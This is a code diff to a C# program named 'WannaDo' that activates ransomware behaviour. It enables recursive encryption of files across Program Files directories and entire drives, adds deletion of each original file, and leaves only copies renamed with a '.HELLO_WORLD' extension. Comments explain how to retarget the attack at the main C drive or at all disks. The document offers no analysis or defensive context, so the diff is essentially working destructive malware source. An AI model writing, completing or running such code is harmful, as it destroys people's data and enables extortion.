@@ -20,32 +20,29 @@ namespace WannaDo {
             }
         }
 
-        private static void AddTarget () {
+        private static void AddAvoid () {
             //add target folders to the list
             avoid.Add (new Avoid { Id = 1, FolderName = "Microsoft" });
-            avoid.Add (new Avoid { Id = 1, FolderName = "Intel" });
-            avoid.Add (new Avoid { Id = 1, FolderName = "Windows" });
+            avoid.Add (new Avoid { Id = 2, FolderName = "Intel" });
+            avoid.Add (new Avoid { Id = 3, FolderName = "Windows" });
+            avoid.Add (new Avoid { Id = 4, FolderName = "System Volume Information" });
         }
 
-        private static void AddAvoid () {
+        private static void AddTarget () {
             //add avoid folders to the list
             target.Add (new Target { Id = 1, DirectoryName = @"C:\Program Files\" });
             target.Add (new Target { Id = 2, DirectoryName = @"C:\Program Files (x86)\" });
         }
 
-        private static void EncryptFile (bool all_foldes, string sourcePath, string cryptoExtension) {
+        private static void EncryptFile (string sourcePath, string cryptoExtension) {
             Cryptography crypto = new Cryptography ();
 
             //encrypt directory and subdirectory files
-            if (all_foldes) {
-                string noExtName = Path.GetFileNameWithoutExtension (sourcePath);
-                string dirName = Path.GetDirectoryName (sourcePath);
-                string destPath = $"{dirName}\\{noExtName}{cryptoExtension}";
-
-                crypto.EncryptFile (sourcePath, destPath);
-            } else {
-                crypto.EncryptFile ("", "");
-            }
+            string noExtName = Path.GetFileNameWithoutExtension (sourcePath);
+            string dirName = Path.GetDirectoryName (sourcePath);
+            string destPath = $"{dirName}\\{noExtName}{cryptoExtension}";
+            crypto.EncryptFile (sourcePath, destPath);
+            File.Delete(sourcePath);
         }
 
         ///// MAIN FUNCTION /////
@@ -55,7 +52,7 @@ namespace WannaDo {
             AddTarget ();
 
             foreach (string disk in DiskLetters) {
-                if (disk.StartsWith ('C')) //avoid windows, intel, microsoft folder
+                if (disk.StartsWith ('Z')/*Main Disk is C, otherwise change the Disk Letter*/) //avoid windows, intel, microsoft folder
                 {
                     //get all directories
                     for (int i = 0; i < target.Count; i++) {
@@ -73,7 +70,7 @@ namespace WannaDo {
                                     foreach (string file in files) {
                                         Console.WriteLine (file);
                                         //encrypt here
-                                        //EncryptFile(true, file, ".HELLO_WORLD");
+                                        EncryptFile(file, ".HELLO_WORLD");
                                     }
                                 } catch (UnauthorizedAccessException ex) {
                                     Console.WriteLine (ex.Message);
@@ -82,21 +79,19 @@ namespace WannaDo {
                             }
                         }
                     }
-                } else {
+                } else if (disk.StartsWith ('Y') /*Insert Disk Letter or change else if to else for all Disks*/) {
                     //encrypt all 
                     var dirs = Directory.GetDirectories (disk);
                     foreach (string dir in dirs) {
-
-                        if (dir.Contains (avoid[0].FolderName) || dir.Contains (avoid[1].FolderName) || dir.Contains (avoid[2].FolderName)) {
-                            //get avoid dirs
+                        if (dir.Contains (avoid[3].FolderName)) {
+                            //avoid System Volume Information folder
                         } else {
-                            //get target files into dirs
                             try {
                                 var files = Directory.GetFiles (dir, "*", SearchOption.AllDirectories);
                                 foreach (string file in files) {
                                     Console.WriteLine (file);
                                     //encrypt here
-                                    EncryptFile(true, file, ".HELLO_WORLD");
+                                    EncryptFile (file, ".HELLO_WORLD");
                                 }
                             } catch (UnauthorizedAccessException ex) {
                                 Console.WriteLine (ex.Message);
